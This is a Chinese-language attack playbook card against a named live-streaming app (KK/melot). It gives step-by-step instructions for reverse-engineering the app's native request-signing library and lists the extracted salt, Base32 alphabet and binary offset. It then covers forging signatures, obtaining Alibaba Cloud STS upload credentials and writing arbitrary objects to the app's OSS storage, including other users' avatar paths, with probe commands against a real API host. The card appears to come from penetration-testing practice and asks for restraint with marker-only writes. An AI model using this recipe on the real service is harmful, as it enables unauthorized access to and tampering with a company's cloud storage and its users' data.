# APK JNI 签名 → 上传 STS → OSS 任意写

金标准：`kktv5_20260904`（KK / 美秀 / melot，`libmagic.so` `em5`）。  
同类栈下次直接走本卡，不要只 `apk_recon.py strings` 然后对着盐值盲猜 MD5。

## 何时用

出现任意一组：

- `meShow/entrance` + `FuncTag` + `sv`
- `libmagic.so` / `Java_com_melot_magic_Magic_em5`
- `GetUploadKey` / `OSSStsTokenCredentialProvider` / 回包 `accessKeyID` + `upToken` 且 AK 以 `STS.` 开头
- 直播 CDN `ares.*` / `ukktv*` / 网宿 `w.kunlungr.com`
- 包名或域名含 `kktv` / `melot` / `meshow`

**不要走这张卡**

| 指纹 | 走 |
|------|-----|
| `IdentityPoolId` / Cognito Unauth | `cognito-unauth-s3-chain` |
| 永久 `LTAI` + 长 SK | `云府·临钥.md` |
| `/actuator/heapdump` | `spring-actuator-cloud-takeover` |
| 只抽 APK 字符串、还没还原 native | 先 `apk-recon`，再回本卡反汇编 |

## 成功口径（禁止跳级）

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | so 里定位到 `em5`/`sign` 的盐 + 编码表 | 只看到 `@kK1818$` / `Kik8Lin8` 字符串 |
| L2 | 伪造 `sv` 调通至少一个需签接口 | 无 `sv` 的公开 FuncTag 成功 |
| L2b | `52080101`（或等价 GetUploadKey）吐出 STS | 只有 bucket 名 |
| L3 | `GetCallerIdentity` + **自建 marker** `PutObject` 200 且 CDN/源站可读 | 把 STS 当成 ECS/RDS 根钥 |
| L3b | 无前缀限制（根目录 / 他人头像路径也能 Put） | 只能写服务器分配的 `fileUrl` |

**OSS 写入 ≠ 主机 / 数据库。** 会话角色常见名 `*oss*defaultrole`，ECS/RDS 会 `Forbidden.RAM`。

## 强制顺序

```text
① apk-recon 抽入口 / FuncTag / GetUploadKey / so 名
② capstone/objdump 反汇编 JNI，跟 ADRP+ADD 拿 16 字节盐，不要猜 strings
③ 还原：排序拼参 → MD5(concat+salt) → 自定义 Base32
④ 带 sv 扫 FuncTag：平台级泄露 vs token 绑定
⑤ GetUploadKey → STS → GetCallerIdentity → 认角色
⑥ write-probe 只写 daaixianzun marker；覆盖真头像先问
⑦ 填对象矩阵。专卡阴性必须回表，禁止「拿到 STS = 接管云」
```

## KK / 美秀 钉死材料（可复用同一实现，盐表换掉）

Java 拼参（`SecurityFunctionsUtil`）：

1. key 不区分大小写排序
2. 除最后一个外拼 `key:value`
3. 最后一个只拼 `key:`，value 作为 `em5` 第二参

native：

```
concat = str1 + str2 + "cc16be4b:346c51d"
digest = MD5(concat)
sv     = custom_base32(digest, "AB56DE3C8L2WF4UVM7JRSGPQYZTXK9HN")   # 26 字符
```

盐在 `.rodata`，KK 金标准偏移 `0x2d00d`；旁边常有**另一张** 32 字符表，用错表会一直 `40010002`。

上传：`FuncTag=52080101`，参数 `mimeType/resumeUp/resType/suffix/abroad`。  
入口：`https://<sapi>/meShow/entrance?parameter=<JSON>`。

STS 角色样例：`acs:ram::<AccountId>:assumed-role/aliyunkkossdefaultrole/kk_app_<userId>`。  
会话策略：Put 无路径限制，List/Delete 拒绝。审计文件可能删不掉。

## 对象矩阵怎么填

| 格子 | 本卡常见结果 |
|------|----------------|
| 自己×读 | 余额 / 绑定三方 / 充值单（token 绑定） |
| 他人×读 | 另一 host 未授权个人主页；平台级 FuncTag（封号、抽奖、家族房间） |
| 自己×写 / 他人×写 | OSS 对象；他人头像路径可写但不等于 RCE |
| 加款 | 支付 RSA 严签时阴性，回表 |
| 配置 / 主机 | STS 角色不是 Root；heapdump 另卡 |

## 失败处理

- 全是 `40010002`：盐或 Base32 表错，回去看 ADRP 立即数，禁止再枚举 MD5 变体结案。
- STS 有但 Put 403 `InvalidAccessKeyId`：票过期，重新 GetUploadKey。
- Put 200 但 CDN 424：走 OSS 源站域名或带网宿 `auth_key`。
- `DescribeInstances` 403：记「会话策略仅 OSS」，不要当云接管失败重试 20 个 region。

## 命令

```bash
# 从 so 抽盐/表
python3 炼蛊房/apk_jni_oss_sts_probe.py extract-so \
  --so /tmp/kk_so/libmagic.so --case <案卷>

python3 炼蛊房/apk_jni_oss_sts_probe.py entrance \
  --base https://sapi.kktv1.com --tag 10005030 \
  --user-id <uid> --token <token> --case <案卷>

# 取 STS + 认身份
python3 炼蛊房/apk_jni_oss_sts_probe.py sts \
  --base https://sapi.kktv1.com --user-id <uid> --token <token> --case <案卷>

# 只写自建 marker
python3 炼蛊房/apk_jni_oss_sts_probe.py write-probe \
  --case <案卷> --insecure
```
